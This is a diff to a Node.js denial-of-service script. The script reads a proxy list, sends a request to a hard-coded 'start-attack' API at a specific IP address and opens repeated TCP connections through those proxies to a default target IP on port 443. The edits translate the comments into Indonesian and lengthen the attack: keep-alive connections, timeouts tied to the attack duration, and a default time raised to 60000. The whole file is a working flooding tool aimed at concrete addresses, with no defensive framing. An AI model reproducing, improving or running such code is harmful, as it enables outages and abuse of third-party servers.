@@ -5,15 +5,15 @@ const axios = require('axios');
 // Load proxy list from file
 const proxies = fs.readFileSync('Proxy.txt', 'utf-8').toString().trim().split('\n');
 
-// API endpoint and request parameters
-const apiEndpoint = 'http://170.64.166.87:8080/api/start-attack'; // Adjust the URL if necessary
+// API endpoint dan parameter permintaan
+const apiEndpoint = 'http://170.64.166.87:8080/api/start-attack'; // Endpoint yang benar
 
-// Read command line arguments
-const [,, host = '152.42.247.134', port = 443, time = 60] = process.argv;
+// Membaca argumen baris perintah
+const [,, host = '152.42.247.134', port = 443, time = 60000] = process.argv;
 const targetPort = parseInt(port, 10);
 const attackTime = parseInt(time, 10);
 
-// Function to start an attack
+// Fungsi untuk memulai serangan
 async function startAttack(host, port, time) {
     try {
         const response = await axios.post(apiEndpoint, {
@@ -38,19 +38,19 @@ function createTCPConnection() {
 
     const socket = net.connect(proxyPort, proxyHost, () => {
         console.log(`Connected to proxy ${proxyHost}:${proxyPort}`);
-        startAttack(host, targetPort, attackTime); // Memulai serangan setelah koneksi berhasil
+        startAttack(host, targetPort, attackTime); // Mulai serangan setelah koneksi berhasil
     });
 
     socket.setKeepAlive(false, 0);
-    socket.setTimeout(5000);
+    socket.setTimeout(attackTime); // Set timeout sesuai durasi serangan
 
-    socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
+    socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`);
 
     socket.on('data', (data) => {
         console.log(`Data received: ${data}`);
         setTimeout(() => {
             socket.destroy();
-        }, 5000);
+        }, attackTime); // Menjaga koneksi tetap aktif selama durasi serangan
     });
 
     socket.on('error', (err) => {
@@ -62,6 +62,5 @@ function createTCPConnection() {
     });
 }
 
-
-// Create connections periodically
-setInterval(createTCPConnection, 10000); // Adjust interval as needed
+// Buat koneksi secara berkala
+setInterval(createTCPConnection, 10000); // Sesuaikan interval sesuai kebutuhan
